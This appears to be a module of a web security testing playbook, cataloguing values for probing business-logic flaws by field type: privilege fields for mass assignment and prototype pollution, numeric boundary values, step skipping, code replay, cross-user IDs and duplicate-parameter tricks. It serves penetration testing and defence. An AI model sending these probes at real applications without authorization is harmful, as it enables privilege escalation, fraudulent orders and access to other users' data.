# Payload variants — the business-logic value alphabet, per field type

A "payload" in logic-flaw work is not an injection string — it is a
*value* the workflow shouldn't accept. This module is the catalogue, per
field type. Each row is one probe; each probe needs a baseline pair.

## Role / privilege fields

Sent at `register`, `update`, or any field-binding endpoint:

```
role=admin                     isAdmin=true
role=administrator             is_admin=true
role=root                      admin=true
role=superuser                 isAdmin=1
role=staff                     staff=true
role=moderator                 moderator=true
role=["admin"]                 role[0]=admin
role={"name":"admin"}          "role":{"$ne":"user"}      (object-typed)
user.role=admin                user[role]=admin
permissions=admin              permissions=["*"]
scope=admin                    scope="*"
groups=admin                   groups=["admin","wheel"]
flags=admin                    flags={"admin":true}
plan=enterprise                tier=pro
subscription=premium           verified=true
email_verified=true            is_verified=true
balance=1000000                credits=999999
__proto__={"role":"admin"}     constructor.prototype.role=admin
```

Read-back through a separate GET every time. `role: user` on read-back =
allowlist falsifier — STOP, change layer.

## Numeric fields — the boundary alphabet

```
quantity=-1          quantity=0             quantity=-0
quantity=0.1         quantity=0.0000001     quantity=1.0
quantity=1e0         quantity=1E0           quantity=1e309
quantity=1e308       quantity=NaN           quantity=nan
quantity=Infinity    quantity=inf           quantity=-Infinity
quantity=2147483647  quantity=2147483648    quantity=-2147483648
quantity=4294967295  quantity=4294967296    quantity=18446744073709551615
quantity=9007199254740991    quantity=9007199254740992
quantity=0x10        quantity=0o10          quantity=0b10
quantity=010         quantity=1,000         quantity=1 000
quantity=+1          quantity=" 1"          quantity="1 "
quantity=""          quantity=null          quantity=[]
quantity={}          quantity=true          quantity="1"
price=-1             price=0                discount=101
discount=-50         discount=200           tax=-1
amount=0.001         rate=1.0000001         coupon=<expired>
```

A `200` on `NaN` with a `NaN` total that still confirms the order is a
confirmed gap — record the total verbatim.

## Index / ID fields (the Pachinko shape)

```
id=<doc_limit>       id=<doc_limit>+1       id=<doc_limit>*2
id=-1                id=0                   id=<ui_limit>+1
id=65535             id=65536               id=0x1000
offset=-1            index=2147483647       index=2147483648
```

Each boundary value tests a different word width. The check-vs-transform
gap shows as a *different-layer* rejection for the just-past-limit value —
compare error text against a malformed-ID rejection.

## Workflow / step fields

```
step=2 (skip 1)      step=3 (skip 2)        step=last
step=0               step=-1                step=99
state=confirmed      state=paid             status=complete
phase=final          stage=done             currentStep=terminal
token=<replayed>     orderId=<fresh>        cartId=<other user's>
```

GET the terminal endpoint directly too — `/confirm`, `/flag`, `/complete`
may check nothing.

## Idempotency / replay fields

```
Idempotency-Key: <same-key>        sent twice
request_id=<same>                  sent twice
code=<consumed>                    re-sent
code=<expired>                     sent after expiry
code=<other user's>                cross-user replay
amount=100, amount=200             same idempotency key, mutated body
```

## Time fields

```
expiry=2020-01-01            expiry=<epoch 0>         expiry=now
expiry=<now-1s>              expiry=<now+1s>          notBefore=<future>
createdAt=1970-01-01         timestamp=-1             date=0x0
expiry="2038-01-19"          expiry="2038-01-20"      (Y2038 boundary)
```

## Ownership / object fields

```
objectId=<other user>   docId=<other>     recordId=<seq-1>
owner=<admin uid>       userId=1          accountId=0
```

(Ownership shapes are IDOR's home ground — route per `class-boundary.md`.)

## Encoded duplicates — reaching the binder twice

```
?role=user&role=admin            last-wins vs first-wins
{"role":"user","role":"admin"}   duplicate JSON keys
role=user&ROLE=admin             case-collision
role%3Dadmin=...                 encoded key
```

Parsers disagree on which duplicate wins — the binder may take the second
while the validator saw the first (a parser differential: see
`web-parser-differential` when the disagreement is in the HTTP layer).
